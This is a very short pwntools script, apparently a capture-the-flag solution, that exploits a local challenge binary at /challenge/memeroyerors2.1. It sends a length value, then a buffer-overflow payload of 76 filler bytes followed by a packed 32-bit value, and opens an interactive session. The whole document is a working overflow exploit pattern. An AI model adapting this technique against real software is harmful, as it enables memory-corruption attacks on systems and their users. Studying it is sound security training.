from pwn import *

p=process('/challenge/memeroyerors2.1')
p.recv()
p.sendline(b'80')
p.recv()
payload=b'a'*76+p32(0x53b69ef4)
p.sendline(payload)

p.interactive()